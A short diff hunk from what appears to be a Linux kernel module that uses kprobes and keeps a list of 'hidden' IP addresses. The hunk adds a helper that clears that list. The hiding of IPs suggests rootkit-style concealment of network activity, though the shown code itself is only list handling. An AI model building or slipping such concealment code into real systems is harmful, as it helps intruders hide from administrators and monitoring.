@@ -154,6 +154,13 @@ g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
     return 0;
 }
 
+void
+clear_hidden_ips(void)
+{
+    ip_list_t_ptr i = hidden_ips_tail;
+    while ((i = remove_ip_from_list(i, i->ip, i->version)));
+}
+
 bool
 list_contains_ip(ip_list_t_ptr list, ip_t ip, ip_version version)
 {
